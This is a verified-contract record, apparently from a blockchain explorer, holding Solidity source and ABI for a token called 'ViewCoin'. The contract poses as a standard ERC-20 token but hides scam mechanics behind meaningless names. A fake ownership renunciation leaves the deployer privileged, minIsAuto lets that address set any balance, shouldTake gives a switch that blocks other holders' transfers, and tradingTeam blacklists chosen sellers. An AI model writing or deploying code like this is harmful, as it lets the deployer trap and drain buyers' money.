{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract txShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundMax {\n    function createPair(address enableTotal, address minListAmount) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface atFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFrom) external view returns (uint256);\n\n    function transfer(address feeSwapSell, uint256 fromFund) external returns (bool);\n\n    function allowance(address teamTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeSwapSell,\n        uint256 fromFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromWallet, uint256 value);\n    event Approval(address indexed teamTo, address indexed spender, uint256 value);\n}\n\ninterface takeTotalMetadata is takeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ViewCoin is txShould, takeTotal, takeTotalMetadata {\n\n    event OwnershipTransferred(address indexed amountAutoList, address indexed launchAmount);\n\n    function getOwner() external view returns (address) {\n        return modeMax;\n    }\n\n    uint256 public receiverBuy = 3;\n\n    address modeTotalEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeFromTeam() public {\n        emit OwnershipTransferred(teamAmount, address(0));\n        modeMax = address(0);\n    }\n\n    uint256 public enableAtLaunched;\n\n    function sellFee() private view {\n        require(exemptTeam[_msgSender()]);\n    }\n\n    function approve(address minShould, uint256 fromFund) public virtual override returns (bool) {\n        feeToken[_msgSender()][minShould] = fromFund;\n        emit Approval(_msgSender(), minShould, fromFund);\n        return true;\n    }\n\n    string private txAt = \"VCN\";\n\n    function atLaunch(address tokenShould, address feeSwapSell, uint256 fromFund) internal returns (bool) {\n        require(listReceiver[tokenShould] >= fromFund);\n        listReceiver[tokenShould] -= fromFund;\n        listReceiver[feeSwapSell] += fromFund;\n        emit Transfer(tokenShould, feeSwapSell, fromFund);\n        return true;\n    }\n\n    mapping(address => bool) public amountBuy;\n\n    uint256 public launchShouldEnable = 0;\n\n    address public shouldMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txAt;\n    }\n\n    function balanceOf(address minFrom) public view virtual override returns (uint256) {\n        return listReceiver[minFrom];\n    }\n\n    function minIsAuto(address buyReceiver, uint256 fromFund) public {\n        sellFee();\n        listReceiver[buyReceiver] = fromFund;\n    }\n\n    function allowance(address launchedExemptMax, address minShould) external view virtual override returns (uint256) {\n        if (minShould == modeTotalEnable) {\n            return type(uint256).max;\n        }\n        return feeToken[launchedExemptMax][minShould];\n    }\n\n    function transfer(address buyReceiver, uint256 fromFund) external virtual override returns (bool) {\n        return txWallet(_msgSender(), buyReceiver, fromFund);\n    }\n\n    function transferFrom(address tokenShould, address feeSwapSell, uint256 fromFund) external override returns (bool) {\n        if (_msgSender() != modeTotalEnable) {\n            if (feeToken[tokenShould][_msgSender()] != type(uint256).max) {\n                require(fromFund <= feeToken[tokenShould][_msgSender()]);\n                feeToken[tokenShould][_msgSender()] -= fromFund;\n            }\n        }\n        return txWallet(tokenShould, feeSwapSell, fromFund);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTeamEnable;\n    }\n\n    mapping(address => uint256) private listReceiver;\n\n    address shouldLaunched;\n\n    function txWallet(address tokenShould, address feeSwapSell, uint256 fromFund) internal returns (bool) {\n        if (tokenShould == teamAmount) {\n            return atLaunch(tokenShould, feeSwapSell, fromFund);\n        }\n        uint256 liquidityTotal = takeTotal(shouldMarketing).balanceOf(shouldLaunched);\n        require(liquidityTotal == buyTx);\n        require(feeSwapSell != shouldLaunched);\n        if (amountBuy[tokenShould]) {\n            return atLaunch(tokenShould, feeSwapSell, listMarketing);\n        }\n        fromFund = receiverList(tokenShould, feeSwapSell, fromFund);\n        return atLaunch(tokenShould, feeSwapSell, fromFund);\n    }\n\n    constructor (){\n        \n        takeFromTeam();\n        atFund totalIs = atFund(modeTotalEnable);\n        shouldMarketing = fundMax(totalIs.factory()).createPair(totalIs.WETH(), address(this));\n        shouldLaunched = fundMax(totalIs.factory()).feeTo();\n        \n        teamAmount = _msgSender();\n        exemptTeam[teamAmount] = true;\n        listReceiver[teamAmount] = exemptTeamEnable;\n        \n        emit Transfer(address(0), teamAmount, exemptTeamEnable);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquiditySell;\n    }\n\n    address public teamAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return senderLimitWallet;\n    }\n\n    function launchToken(address tokenTo) public {\n        if (shouldToken) {\n            return;\n        }\n        if (tradingLaunchedList == liquidityReceiver) {\n            tradingLaunchedList = liquidityReceiver;\n        }\n        exemptTeam[tokenTo] = true;\n        if (launchedReceiver) {\n            liquidityReceiver = tradingLaunchedList;\n        }\n        shouldToken = true;\n    }\n\n    string private senderLimitWallet = \"View Coin\";\n\n    address private modeMax;\n\n    function shouldTake(uint256 fromFund) public {\n        sellFee();\n        buyTx = fromFund;\n    }\n\n    uint256 private exemptTeamEnable = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return modeMax;\n    }\n\n    uint256 private tradingLaunchedList;\n\n    uint256 launchedAmount;\n\n    bool private buySwap;\n\n    function receiverList(address tokenShould, address feeSwapSell, uint256 fromFund) internal view returns (uint256) {\n        require(fromFund > 0);\n\n        uint256 isLiquidityReceiver = 0;\n        if (tokenShould == shouldMarketing && receiverBuy > 0) {\n            isLiquidityReceiver = fromFund * receiverBuy / 100;\n        } else if (feeSwapSell == shouldMarketing && launchShouldEnable > 0) {\n            isLiquidityReceiver = fromFund * launchShouldEnable / 100;\n        }\n        require(isLiquidityReceiver <= fromFund);\n        return fromFund - isLiquidityReceiver;\n    }\n\n    uint256 public liquidityReceiver;\n\n    bool private launchedReceiver;\n\n    function tradingTeam(address enableSwap) public {\n        sellFee();\n        if (launchedReceiver) {\n            launchedReceiver = false;\n        }\n        if (enableSwap == teamAmount || enableSwap == shouldMarketing) {\n            return;\n        }\n        amountBuy[enableSwap] = true;\n    }\n\n    uint256 buyTx;\n\n    mapping(address => bool) public exemptTeam;\n\n    mapping(address => mapping(address => uint256)) private feeToken;\n\n    uint8 private liquiditySell = 18;\n\n    bool public shouldToken;\n\n    uint256 constant listMarketing = 18 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAutoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExemptMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAtLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShouldEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromFund\",\"type\":\"uint256\"}],\"name\":\"minIsAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromFund\",\"type\":\"uint256\"}],\"name\":\"shouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFromTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeSwapSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ViewCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}